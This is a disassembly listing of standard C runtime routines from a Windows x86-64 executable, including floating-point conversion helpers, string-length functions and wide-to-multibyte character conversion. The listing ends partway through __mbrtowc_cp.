0000000140008a20 <__b2d_D2A>:
   140008a20:	57                   	push   %rdi
   140008a21:	56                   	push   %rsi
   140008a22:	53                   	push   %rbx
   140008a23:	48 63 41 14          	movslq 0x14(%rcx),%rax
   140008a27:	4c 8d 51 18          	lea    0x18(%rcx),%r10
   140008a2b:	49 8d 1c 82          	lea    (%r10,%rax,4),%rbx
   140008a2f:	44 8b 5b fc          	mov    -0x4(%rbx),%r11d
   140008a33:	48 8d 73 fc          	lea    -0x4(%rbx),%rsi
   140008a37:	41 0f bd cb          	bsr    %r11d,%ecx
   140008a3b:	89 cf                	mov    %ecx,%edi
   140008a3d:	b9 20 00 00 00       	mov    $0x20,%ecx
   140008a42:	83 f7 1f             	xor    $0x1f,%edi
   140008a45:	41 89 c8             	mov    %ecx,%r8d
   140008a48:	41 29 f8             	sub    %edi,%r8d
   140008a4b:	44 89 02             	mov    %r8d,(%rdx)
   140008a4e:	83 ff 0a             	cmp    $0xa,%edi
   140008a51:	7e 7d                	jle    140008ad0 <__b2d_D2A+0xb0>
   140008a53:	44 8d 4f f5          	lea    -0xb(%rdi),%r9d
   140008a57:	49 39 f2             	cmp    %rsi,%r10
   140008a5a:	73 54                	jae    140008ab0 <__b2d_D2A+0x90>
   140008a5c:	8b 53 f8             	mov    -0x8(%rbx),%edx
   140008a5f:	45 85 c9             	test   %r9d,%r9d
   140008a62:	74 53                	je     140008ab7 <__b2d_D2A+0x97>
   140008a64:	44 29 c9             	sub    %r9d,%ecx
   140008a67:	44 89 d8             	mov    %r11d,%eax
   140008a6a:	89 d6                	mov    %edx,%esi
   140008a6c:	41 89 c8             	mov    %ecx,%r8d
   140008a6f:	44 89 c9             	mov    %r9d,%ecx
   140008a72:	d3 e0                	shl    %cl,%eax
   140008a74:	44 89 c1             	mov    %r8d,%ecx
   140008a77:	d3 ee                	shr    %cl,%esi
   140008a79:	44 89 c9             	mov    %r9d,%ecx
   140008a7c:	09 f0                	or     %esi,%eax
   140008a7e:	d3 e2                	shl    %cl,%edx
   140008a80:	48 8d 4b f8          	lea    -0x8(%rbx),%rcx
   140008a84:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140008a89:	48 c1 e0 20          	shl    $0x20,%rax
   140008a8d:	49 39 ca             	cmp    %rcx,%r10
   140008a90:	73 31                	jae    140008ac3 <__b2d_D2A+0xa3>
   140008a92:	44 8b 4b f4          	mov    -0xc(%rbx),%r9d
   140008a96:	44 89 c1             	mov    %r8d,%ecx
   140008a99:	41 d3 e9             	shr    %cl,%r9d
   140008a9c:	44 09 ca             	or     %r9d,%edx
   140008a9f:	48 09 d0             	or     %rdx,%rax
   140008aa2:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140008aa7:	5b                   	pop    %rbx
   140008aa8:	5e                   	pop    %rsi
   140008aa9:	5f                   	pop    %rdi
   140008aaa:	c3                   	ret
   140008aab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008ab0:	31 d2                	xor    %edx,%edx
   140008ab2:	83 ff 0b             	cmp    $0xb,%edi
   140008ab5:	75 59                	jne    140008b10 <__b2d_D2A+0xf0>
   140008ab7:	44 89 d8             	mov    %r11d,%eax
   140008aba:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140008abf:	48 c1 e0 20          	shl    $0x20,%rax
   140008ac3:	48 09 d0             	or     %rdx,%rax
   140008ac6:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140008acb:	5b                   	pop    %rbx
   140008acc:	5e                   	pop    %rsi
   140008acd:	5f                   	pop    %rdi
   140008ace:	c3                   	ret
   140008acf:	90                   	nop
   140008ad0:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140008ad5:	44 89 d8             	mov    %r11d,%eax
   140008ad8:	45 31 c0             	xor    %r8d,%r8d
   140008adb:	29 f9                	sub    %edi,%ecx
   140008add:	d3 e8                	shr    %cl,%eax
   140008adf:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140008ae4:	48 c1 e0 20          	shl    $0x20,%rax
   140008ae8:	49 39 f2             	cmp    %rsi,%r10
   140008aeb:	73 07                	jae    140008af4 <__b2d_D2A+0xd4>
   140008aed:	44 8b 43 f8          	mov    -0x8(%rbx),%r8d
   140008af1:	41 d3 e8             	shr    %cl,%r8d
   140008af4:	8d 4f 15             	lea    0x15(%rdi),%ecx
   140008af7:	44 89 da             	mov    %r11d,%edx
   140008afa:	d3 e2                	shl    %cl,%edx
   140008afc:	44 09 c2             	or     %r8d,%edx
   140008aff:	48 09 d0             	or     %rdx,%rax
   140008b02:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140008b07:	5b                   	pop    %rbx
   140008b08:	5e                   	pop    %rsi
   140008b09:	5f                   	pop    %rdi
   140008b0a:	c3                   	ret
   140008b0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008b10:	44 89 d8             	mov    %r11d,%eax
   140008b13:	44 89 c9             	mov    %r9d,%ecx
   140008b16:	31 d2                	xor    %edx,%edx
   140008b18:	d3 e0                	shl    %cl,%eax
   140008b1a:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140008b1f:	48 c1 e0 20          	shl    $0x20,%rax
   140008b23:	48 09 d0             	or     %rdx,%rax
   140008b26:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140008b2b:	5b                   	pop    %rbx
   140008b2c:	5e                   	pop    %rsi
   140008b2d:	5f                   	pop    %rdi
   140008b2e:	c3                   	ret
   140008b2f:	90                   	nop

0000000140008b30 <__d2b_D2A>:
   140008b30:	56                   	push   %rsi
   140008b31:	53                   	push   %rbx
   140008b32:	48 83 ec 38          	sub    $0x38,%rsp
   140008b36:	0f 11 74 24 20       	movups %xmm6,0x20(%rsp)
   140008b3b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008b40:	4c 89 c6             	mov    %r8,%rsi
   140008b43:	66 0f 28 f0          	movapd %xmm0,%xmm6
   140008b47:	48 89 d3             	mov    %rdx,%rbx
   140008b4a:	e8 01 f6 ff ff       	call   140008150 <__Balloc_D2A>
   140008b4f:	49 89 c0             	mov    %rax,%r8
   140008b52:	48 85 c0             	test   %rax,%rax
   140008b55:	74 5c                	je     140008bb3 <__d2b_D2A+0x83>
   140008b57:	66 48 0f 7e f0       	movq   %xmm6,%rax
   140008b5c:	48 89 c1             	mov    %rax,%rcx
   140008b5f:	48 c1 e9 20          	shr    $0x20,%rcx
   140008b63:	89 ca                	mov    %ecx,%edx
   140008b65:	c1 e9 14             	shr    $0x14,%ecx
   140008b68:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
   140008b6e:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
   140008b74:	41 89 c9             	mov    %ecx,%r9d
   140008b77:	74 4f                	je     140008bc8 <__d2b_D2A+0x98>
   140008b79:	81 ca 00 00 10 00    	or     $0x100000,%edx
   140008b7f:	85 c0                	test   %eax,%eax
   140008b81:	0f 85 d1 00 00 00    	jne    140008c58 <__d2b_D2A+0x128>
   140008b87:	31 c9                	xor    %ecx,%ecx
   140008b89:	41 c7 40 14 01 00 00 	movl   $0x1,0x14(%r8)
   140008b90:	00 
   140008b91:	b8 35 00 00 00       	mov    $0x35,%eax
   140008b96:	f3 0f bc ca          	tzcnt  %edx,%ecx
   140008b9a:	d3 ea                	shr    %cl,%edx
   140008b9c:	44 8d 51 20          	lea    0x20(%rcx),%r10d
   140008ba0:	41 89 50 18          	mov    %edx,0x18(%r8)
   140008ba4:	44 29 d0             	sub    %r10d,%eax
   140008ba7:	43 8d 94 11 cd fb ff 	lea    -0x433(%r9,%r10,1),%edx
   140008bae:	ff 
   140008baf:	89 13                	mov    %edx,(%rbx)
   140008bb1:	89 06                	mov    %eax,(%rsi)
   140008bb3:	0f 10 74 24 20       	movups 0x20(%rsp),%xmm6
   140008bb8:	4c 89 c0             	mov    %r8,%rax
   140008bbb:	48 83 c4 38          	add    $0x38,%rsp
   140008bbf:	5b                   	pop    %rbx
   140008bc0:	5e                   	pop    %rsi
   140008bc1:	c3                   	ret
   140008bc2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140008bc8:	85 c0                	test   %eax,%eax
   140008bca:	75 44                	jne    140008c10 <__d2b_D2A+0xe0>
   140008bcc:	31 c9                	xor    %ecx,%ecx
   140008bce:	41 c7 40 14 01 00 00 	movl   $0x1,0x14(%r8)
   140008bd5:	00 
   140008bd6:	b8 20 00 00 00       	mov    $0x20,%eax
   140008bdb:	f3 0f bc ca          	tzcnt  %edx,%ecx
   140008bdf:	d3 ea                	shr    %cl,%edx
   140008be1:	44 8d 89 ee fb ff ff 	lea    -0x412(%rcx),%r9d
   140008be8:	41 89 50 18          	mov    %edx,0x18(%r8)
   140008bec:	0f bd d2             	bsr    %edx,%edx
   140008bef:	44 89 0b             	mov    %r9d,(%rbx)
   140008bf2:	83 f2 1f             	xor    $0x1f,%edx
   140008bf5:	29 d0                	sub    %edx,%eax
   140008bf7:	89 06                	mov    %eax,(%rsi)
   140008bf9:	0f 10 74 24 20       	movups 0x20(%rsp),%xmm6
   140008bfe:	4c 89 c0             	mov    %r8,%rax
   140008c01:	48 83 c4 38          	add    $0x38,%rsp
   140008c05:	5b                   	pop    %rbx
   140008c06:	5e                   	pop    %rsi
   140008c07:	c3                   	ret
   140008c08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140008c0f:	00 
   140008c10:	45 31 c9             	xor    %r9d,%r9d
   140008c13:	f3 44 0f bc c8       	tzcnt  %eax,%r9d
   140008c18:	45 85 c9             	test   %r9d,%r9d
   140008c1b:	0f 85 a7 00 00 00    	jne    140008cc8 <__d2b_D2A+0x198>
   140008c21:	41 89 50 1c          	mov    %edx,0x1c(%r8)
   140008c25:	66 41 0f 7e 70 18    	movd   %xmm6,0x18(%r8)
   140008c2b:	85 d2                	test   %edx,%edx
   140008c2d:	0f 85 d5 00 00 00    	jne    140008d08 <__d2b_D2A+0x1d8>
   140008c33:	b8 01 00 00 00       	mov    $0x1,%eax
   140008c38:	ba 01 00 00 00       	mov    $0x1,%edx
   140008c3d:	41 89 40 14          	mov    %eax,0x14(%r8)
   140008c41:	89 d0                	mov    %edx,%eax
   140008c43:	41 81 e9 32 04 00 00 	sub    $0x432,%r9d
   140008c4a:	41 8b 54 90 14       	mov    0x14(%r8,%rdx,4),%edx
   140008c4f:	c1 e0 05             	shl    $0x5,%eax
   140008c52:	eb 98                	jmp    140008bec <__d2b_D2A+0xbc>
   140008c54:	0f 1f 40 00          	nopl   0x0(%rax)
   140008c58:	45 31 d2             	xor    %r10d,%r10d
   140008c5b:	f3 44 0f bc d0       	tzcnt  %eax,%r10d
   140008c60:	45 85 d2             	test   %r10d,%r10d
   140008c63:	74 43                	je     140008ca8 <__d2b_D2A+0x178>
   140008c65:	b9 20 00 00 00       	mov    $0x20,%ecx
   140008c6a:	41 89 d3             	mov    %edx,%r11d
   140008c6d:	44 29 d1             	sub    %r10d,%ecx
   140008c70:	41 d3 e3             	shl    %cl,%r11d
   140008c73:	44 89 d1             	mov    %r10d,%ecx
   140008c76:	d3 e8                	shr    %cl,%eax
   140008c78:	d3 ea                	shr    %cl,%edx
   140008c7a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008c7f:	44 09 d8             	or     %r11d,%eax
   140008c82:	83 fa 01             	cmp    $0x1,%edx
   140008c85:	41 89 50 1c          	mov    %edx,0x1c(%r8)
   140008c89:	83 d9 ff             	sbb    $0xffffffff,%ecx
   140008c8c:	41 89 40 18          	mov    %eax,0x18(%r8)
   140008c90:	b8 35 00 00 00       	mov    $0x35,%eax
   140008c95:	41 89 48 14          	mov    %ecx,0x14(%r8)
   140008c99:	44 29 d0             	sub    %r10d,%eax
   140008c9c:	e9 06 ff ff ff       	jmp    140008ba7 <__d2b_D2A+0x77>
   140008ca1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140008ca8:	41 89 50 1c          	mov    %edx,0x1c(%r8)
   140008cac:	b8 35 00 00 00       	mov    $0x35,%eax
   140008cb1:	41 c7 40 14 02 00 00 	movl   $0x2,0x14(%r8)
   140008cb8:	00 
   140008cb9:	66 41 0f 7e 70 18    	movd   %xmm6,0x18(%r8)
   140008cbf:	e9 e3 fe ff ff       	jmp    140008ba7 <__d2b_D2A+0x77>
   140008cc4:	0f 1f 40 00          	nopl   0x0(%rax)
   140008cc8:	41 89 d2             	mov    %edx,%r10d
   140008ccb:	44 89 c9             	mov    %r9d,%ecx
   140008cce:	41 d3 ea             	shr    %cl,%r10d
   140008cd1:	b9 20 00 00 00       	mov    $0x20,%ecx
   140008cd6:	44 29 c9             	sub    %r9d,%ecx
   140008cd9:	45 89 50 1c          	mov    %r10d,0x1c(%r8)
   140008cdd:	d3 e2                	shl    %cl,%edx
   140008cdf:	44 89 c9             	mov    %r9d,%ecx
   140008ce2:	d3 e8                	shr    %cl,%eax
   140008ce4:	09 c2                	or     %eax,%edx
   140008ce6:	41 89 50 18          	mov    %edx,0x18(%r8)
   140008cea:	45 85 d2             	test   %r10d,%r10d
   140008ced:	0f 84 40 ff ff ff    	je     140008c33 <__d2b_D2A+0x103>
   140008cf3:	b8 02 00 00 00       	mov    $0x2,%eax
   140008cf8:	ba 02 00 00 00       	mov    $0x2,%edx
   140008cfd:	e9 3b ff ff ff       	jmp    140008c3d <__d2b_D2A+0x10d>
   140008d02:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140008d08:	41 c7 40 14 02 00 00 	movl   $0x2,0x14(%r8)
   140008d0f:	00 
   140008d10:	b8 40 00 00 00       	mov    $0x40,%eax
   140008d15:	41 b9 ce fb ff ff    	mov    $0xfffffbce,%r9d
   140008d1b:	e9 cc fe ff ff       	jmp    140008bec <__d2b_D2A+0xbc>

0000000140008d20 <__strcp_D2A>:
   140008d20:	48 89 c8             	mov    %rcx,%rax
   140008d23:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140008d27:	0f b6 12             	movzbl (%rdx),%edx
   140008d2a:	88 10                	mov    %dl,(%rax)
   140008d2c:	84 d2                	test   %dl,%dl
   140008d2e:	74 11                	je     140008d41 <__strcp_D2A+0x21>
   140008d30:	0f b6 11             	movzbl (%rcx),%edx
   140008d33:	48 83 c0 01          	add    $0x1,%rax
   140008d37:	48 83 c1 01          	add    $0x1,%rcx
   140008d3b:	88 10                	mov    %dl,(%rax)
   140008d3d:	84 d2                	test   %dl,%dl
   140008d3f:	75 ef                	jne    140008d30 <__strcp_D2A+0x10>
   140008d41:	c3                   	ret
   140008d42:	90                   	nop
   140008d43:	90                   	nop
   140008d44:	90                   	nop
   140008d45:	90                   	nop
   140008d46:	90                   	nop
   140008d47:	90                   	nop
   140008d48:	90                   	nop
   140008d49:	90                   	nop
   140008d4a:	90                   	nop
   140008d4b:	90                   	nop
   140008d4c:	90                   	nop
   140008d4d:	90                   	nop
   140008d4e:	90                   	nop
   140008d4f:	90                   	nop

0000000140008d50 <strnlen>:
   140008d50:	45 31 c0             	xor    %r8d,%r8d
   140008d53:	48 89 c8             	mov    %rcx,%rax
   140008d56:	48 85 d2             	test   %rdx,%rdx
   140008d59:	75 14                	jne    140008d6f <strnlen+0x1f>
   140008d5b:	eb 17                	jmp    140008d74 <strnlen+0x24>
   140008d5d:	0f 1f 00             	nopl   (%rax)
   140008d60:	48 83 c0 01          	add    $0x1,%rax
   140008d64:	49 89 c0             	mov    %rax,%r8
   140008d67:	49 29 c8             	sub    %rcx,%r8
   140008d6a:	49 39 d0             	cmp    %rdx,%r8
   140008d6d:	73 05                	jae    140008d74 <strnlen+0x24>
   140008d6f:	80 38 00             	cmpb   $0x0,(%rax)
   140008d72:	75 ec                	jne    140008d60 <strnlen+0x10>
   140008d74:	4c 89 c0             	mov    %r8,%rax
   140008d77:	c3                   	ret
   140008d78:	90                   	nop
   140008d79:	90                   	nop
   140008d7a:	90                   	nop
   140008d7b:	90                   	nop
   140008d7c:	90                   	nop
   140008d7d:	90                   	nop
   140008d7e:	90                   	nop
   140008d7f:	90                   	nop

0000000140008d80 <wcsnlen>:
   140008d80:	45 31 c0             	xor    %r8d,%r8d
   140008d83:	48 89 d0             	mov    %rdx,%rax
   140008d86:	48 85 d2             	test   %rdx,%rdx
   140008d89:	75 0e                	jne    140008d99 <wcsnlen+0x19>
   140008d8b:	eb 17                	jmp    140008da4 <wcsnlen+0x24>
   140008d8d:	0f 1f 00             	nopl   (%rax)
   140008d90:	49 83 c0 01          	add    $0x1,%r8
   140008d94:	4c 39 c0             	cmp    %r8,%rax
   140008d97:	74 0b                	je     140008da4 <wcsnlen+0x24>
   140008d99:	66 42 83 3c 41 00    	cmpw   $0x0,(%rcx,%r8,2)
   140008d9f:	75 ef                	jne    140008d90 <wcsnlen+0x10>
   140008da1:	4c 89 c0             	mov    %r8,%rax
   140008da4:	c3                   	ret
   140008da5:	90                   	nop
   140008da6:	90                   	nop
   140008da7:	90                   	nop
   140008da8:	90                   	nop
   140008da9:	90                   	nop
   140008daa:	90                   	nop
   140008dab:	90                   	nop
   140008dac:	90                   	nop
   140008dad:	90                   	nop
   140008dae:	90                   	nop
   140008daf:	90                   	nop

0000000140008db0 <__p__fmode>:
   140008db0:	48 8b 05 29 2c 00 00 	mov    0x2c29(%rip),%rax        # 14000b9e0 <.refptr.__imp__fmode>
   140008db7:	48 8b 00             	mov    (%rax),%rax
   140008dba:	c3                   	ret
   140008dbb:	90                   	nop
   140008dbc:	90                   	nop
   140008dbd:	90                   	nop
   140008dbe:	90                   	nop
   140008dbf:	90                   	nop

0000000140008dc0 <__p__commode>:
   140008dc0:	48 8b 05 09 2c 00 00 	mov    0x2c09(%rip),%rax        # 14000b9d0 <.refptr.__imp__commode>
   140008dc7:	48 8b 00             	mov    (%rax),%rax
   140008dca:	c3                   	ret
   140008dcb:	90                   	nop
   140008dcc:	90                   	nop
   140008dcd:	90                   	nop
   140008dce:	90                   	nop
   140008dcf:	90                   	nop

0000000140008dd0 <__p__acmdln>:
   140008dd0:	48 8b 05 e9 2b 00 00 	mov    0x2be9(%rip),%rax        # 14000b9c0 <.refptr.__imp__acmdln>
   140008dd7:	48 8b 00             	mov    (%rax),%rax
   140008dda:	c3                   	ret
   140008ddb:	90                   	nop
   140008ddc:	90                   	nop
   140008ddd:	90                   	nop
   140008dde:	90                   	nop
   140008ddf:	90                   	nop

0000000140008de0 <_get_invalid_parameter_handler>:
   140008de0:	48 8b 05 79 6d 00 00 	mov    0x6d79(%rip),%rax        # 14000fb60 <handler>
   140008de7:	c3                   	ret
   140008de8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140008def:	00 

0000000140008df0 <_set_invalid_parameter_handler>:
   140008df0:	48 89 c8             	mov    %rcx,%rax
   140008df3:	48 87 05 66 6d 00 00 	xchg   %rax,0x6d66(%rip)        # 14000fb60 <handler>
   140008dfa:	c3                   	ret
   140008dfb:	90                   	nop
   140008dfc:	90                   	nop
   140008dfd:	90                   	nop
   140008dfe:	90                   	nop
   140008dff:	90                   	nop

0000000140008e00 <__acrt_iob_func>:
   140008e00:	53                   	push   %rbx
   140008e01:	48 83 ec 20          	sub    $0x20,%rsp
   140008e05:	89 cb                	mov    %ecx,%ebx
   140008e07:	e8 34 05 00 00       	call   140009340 <__iob_func>
   140008e0c:	89 d9                	mov    %ebx,%ecx
   140008e0e:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
   140008e12:	48 c1 e2 04          	shl    $0x4,%rdx
   140008e16:	48 01 d0             	add    %rdx,%rax
   140008e19:	48 83 c4 20          	add    $0x20,%rsp
   140008e1d:	5b                   	pop    %rbx
   140008e1e:	c3                   	ret
   140008e1f:	90                   	nop

0000000140008e20 <__wcrtomb_cp>:
   140008e20:	48 83 ec 58          	sub    $0x58,%rsp
   140008e24:	48 89 c8             	mov    %rcx,%rax
   140008e27:	66 89 54 24 68       	mov    %dx,0x68(%rsp)
   140008e2c:	44 89 c1             	mov    %r8d,%ecx
   140008e2f:	45 85 c0             	test   %r8d,%r8d
   140008e32:	75 1c                	jne    140008e50 <__wcrtomb_cp+0x30>
   140008e34:	66 81 fa ff 00       	cmp    $0xff,%dx
   140008e39:	77 59                	ja     140008e94 <__wcrtomb_cp+0x74>
   140008e3b:	88 10                	mov    %dl,(%rax)
   140008e3d:	b8 01 00 00 00       	mov    $0x1,%eax
   140008e42:	48 83 c4 58          	add    $0x58,%rsp
   140008e46:	c3                   	ret
   140008e47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140008e4e:	00 00 
   140008e50:	48 8d 54 24 4c       	lea    0x4c(%rsp),%rdx
   140008e55:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140008e5a:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140008e5f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140008e65:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140008e6a:	31 d2                	xor    %edx,%edx
   140008e6c:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   140008e73:	00 
   140008e74:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140008e7b:	00 00 
   140008e7d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008e82:	ff 15 f8 74 00 00    	call   *0x74f8(%rip)        # 140010380 <__imp_WideCharToMultiByte>
   140008e88:	85 c0                	test   %eax,%eax
   140008e8a:	74 08                	je     140008e94 <__wcrtomb_cp+0x74>
   140008e8c:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
   140008e90:	85 d2                	test   %edx,%edx
   140008e92:	74 ae                	je     140008e42 <__wcrtomb_cp+0x22>
   140008e94:	e8 cf 04 00 00       	call   140009368 <_errno>
   140008e99:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140008e9f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140008ea4:	48 83 c4 58          	add    $0x58,%rsp
   140008ea8:	c3                   	ret
   140008ea9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140008eb0 <wcrtomb>:
   140008eb0:	57                   	push   %rdi
   140008eb1:	56                   	push   %rsi
   140008eb2:	53                   	push   %rbx
   140008eb3:	48 83 ec 30          	sub    $0x30,%rsp
   140008eb7:	48 85 c9             	test   %rcx,%rcx
   140008eba:	48 89 cb             	mov    %rcx,%rbx
   140008ebd:	48 8d 44 24 2b       	lea    0x2b(%rsp),%rax
   140008ec2:	89 d6                	mov    %edx,%esi
   140008ec4:	48 0f 44 d8          	cmove  %rax,%rbx
   140008ec8:	e8 63 04 00 00       	call   140009330 <___mb_cur_max_func>
   140008ecd:	89 c7                	mov    %eax,%edi
   140008ecf:	e8 54 04 00 00       	call   140009328 <___lc_codepage_func>
   140008ed4:	0f b7 d6             	movzwl %si,%edx
   140008ed7:	41 89 f9             	mov    %edi,%r9d
   140008eda:	48 89 d9             	mov    %rbx,%rcx
   140008edd:	41 89 c0             	mov    %eax,%r8d
   140008ee0:	e8 3b ff ff ff       	call   140008e20 <__wcrtomb_cp>
   140008ee5:	48 98                	cltq
   140008ee7:	48 83 c4 30          	add    $0x30,%rsp
   140008eeb:	5b                   	pop    %rbx
   140008eec:	5e                   	pop    %rsi
   140008eed:	5f                   	pop    %rdi
   140008eee:	c3                   	ret
   140008eef:	90                   	nop

0000000140008ef0 <wcsrtombs>:
   140008ef0:	41 56                	push   %r14
   140008ef2:	41 55                	push   %r13
   140008ef4:	41 54                	push   %r12
   140008ef6:	55                   	push   %rbp
   140008ef7:	57                   	push   %rdi
   140008ef8:	56                   	push   %rsi
   140008ef9:	53                   	push   %rbx
   140008efa:	48 83 ec 30          	sub    $0x30,%rsp
   140008efe:	45 31 f6             	xor    %r14d,%r14d
   140008f01:	49 89 d4             	mov    %rdx,%r12
   140008f04:	48 89 cb             	mov    %rcx,%rbx
   140008f07:	4c 89 c5             	mov    %r8,%rbp
   140008f0a:	e8 19 04 00 00       	call   140009328 <___lc_codepage_func>
   140008f0f:	89 c6                	mov    %eax,%esi
   140008f11:	e8 1a 04 00 00       	call   140009330 <___mb_cur_max_func>
   140008f16:	4d 8b 2c 24          	mov    (%r12),%r13
   140008f1a:	89 c7                	mov    %eax,%edi
   140008f1c:	4d 85 ed             	test   %r13,%r13
   140008f1f:	74 48                	je     140008f69 <wcsrtombs+0x79>
   140008f21:	48 85 db             	test   %rbx,%rbx
   140008f24:	74 5a                	je     140008f80 <wcsrtombs+0x90>
   140008f26:	48 85 ed             	test   %rbp,%rbp
   140008f29:	75 20                	jne    140008f4b <wcsrtombs+0x5b>
   140008f2b:	e9 90 00 00 00       	jmp    140008fc0 <wcsrtombs+0xd0>
   140008f30:	48 98                	cltq
   140008f32:	48 01 c3             	add    %rax,%rbx
   140008f35:	49 01 c6             	add    %rax,%r14
   140008f38:	80 7b ff 00          	cmpb   $0x0,-0x1(%rbx)
   140008f3c:	0f 84 8e 00 00 00    	je     140008fd0 <wcsrtombs+0xe0>
   140008f42:	49 83 c5 02          	add    $0x2,%r13
   140008f46:	49 39 ee             	cmp    %rbp,%r14
   140008f49:	73 75                	jae    140008fc0 <wcsrtombs+0xd0>
   140008f4b:	41 0f b7 55 00       	movzwl 0x0(%r13),%edx
   140008f50:	41 89 f9             	mov    %edi,%r9d
   140008f53:	41 89 f0             	mov    %esi,%r8d
   140008f56:	48 89 d9             	mov    %rbx,%rcx
   140008f59:	e8 c2 fe ff ff       	call   140008e20 <__wcrtomb_cp>
   140008f5e:	85 c0                	test   %eax,%eax
   140008f60:	7f ce                	jg     140008f30 <wcsrtombs+0x40>
   140008f62:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   140008f69:	4c 89 f0             	mov    %r14,%rax
   140008f6c:	48 83 c4 30          	add    $0x30,%rsp
   140008f70:	5b                   	pop    %rbx
   140008f71:	5e                   	pop    %rsi
   140008f72:	5f                   	pop    %rdi
   140008f73:	5d                   	pop    %rbp
   140008f74:	41 5c                	pop    %r12
   140008f76:	41 5d                	pop    %r13
   140008f78:	41 5e                	pop    %r14
   140008f7a:	c3                   	ret
   140008f7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008f80:	48 8d 6c 24 2b       	lea    0x2b(%rsp),%rbp
   140008f85:	eb 1f                	jmp    140008fa6 <wcsrtombs+0xb6>
   140008f87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140008f8e:	00 00 
   140008f90:	48 63 d0             	movslq %eax,%rdx
   140008f93:	83 e8 01             	sub    $0x1,%eax
   140008f96:	48 98                	cltq
   140008f98:	49 01 d6             	add    %rdx,%r14
   140008f9b:	80 7c 04 2b 00       	cmpb   $0x0,0x2b(%rsp,%rax,1)
   140008fa0:	74 3e                	je     140008fe0 <wcsrtombs+0xf0>
   140008fa2:	49 83 c5 02          	add    $0x2,%r13
   140008fa6:	41 0f b7 55 00       	movzwl 0x0(%r13),%edx
   140008fab:	41 89 f9             	mov    %edi,%r9d
   140008fae:	41 89 f0             	mov    %esi,%r8d
   140008fb1:	48 89 e9             	mov    %rbp,%rcx
   140008fb4:	e8 67 fe ff ff       	call   140008e20 <__wcrtomb_cp>
   140008fb9:	85 c0                	test   %eax,%eax
   140008fbb:	7f d3                	jg     140008f90 <wcsrtombs+0xa0>
   140008fbd:	eb a3                	jmp    140008f62 <wcsrtombs+0x72>
   140008fbf:	90                   	nop
   140008fc0:	4d 89 2c 24          	mov    %r13,(%r12)
   140008fc4:	eb a3                	jmp    140008f69 <wcsrtombs+0x79>
   140008fc6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140008fcd:	00 00 00 
   140008fd0:	49 c7 04 24 00 00 00 	movq   $0x0,(%r12)
   140008fd7:	00 
   140008fd8:	49 83 ee 01          	sub    $0x1,%r14
   140008fdc:	eb 8b                	jmp    140008f69 <wcsrtombs+0x79>
   140008fde:	66 90                	xchg   %ax,%ax
   140008fe0:	49 83 ee 01          	sub    $0x1,%r14
   140008fe4:	eb 83                	jmp    140008f69 <wcsrtombs+0x79>
   140008fe6:	90                   	nop
   140008fe7:	90                   	nop
   140008fe8:	90                   	nop
   140008fe9:	90                   	nop
   140008fea:	90                   	nop
   140008feb:	90                   	nop
   140008fec:	90                   	nop
   140008fed:	90                   	nop
   140008fee:	90                   	nop
   140008fef:	90                   	nop

0000000140008ff0 <__mbrtowc_cp>:
   140008ff0:	57                   	push   %rdi
   140008ff1:	53                   	push   %rbx
   140008ff2:	48 83 ec 48          	sub    $0x48,%rsp
   140008ff6:	48 89 cf             	mov    %rcx,%rdi
   140008ff9:	48 89 d3             	mov    %rdx,%rbx
   140008ffc:	48 85 d2             	test   %rdx,%rdx
   140008fff:	0f 84 c0 00 00 00    	je     1400090c5 <__mbrtowc_cp+0xd5>
   140009005:	4d 85 c0             	test   %r8,%r8
   140009008:	0f 84 26 01 00 00    	je     140009134 <__mbrtowc_cp+0x144>
   14000900e:	41 8b 01             	mov    (%r9),%eax
   140009011:	0f b6 12             	movzbl (%rdx),%edx
   140009014:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
   14000901b:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   14000901f:	84 d2                	test   %dl,%dl
   140009021:	0f 84 99 00 00 00    	je     1400090c0 <__mbrtowc_cp+0xd0>
   140009027:	83 bc 24 88 00 00 00 	cmpl   $0x1,0x88(%rsp)
   14000902e:	01 
   14000902f:	76 77                	jbe    1400090a8 <__mbrtowc_cp+0xb8>
   140009031:	84 c0                	test   %al,%al
   140009033:	0f 85 97 00 00 00    	jne    1400090d0 <__mbrtowc_cp+0xe0>
   140009039:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
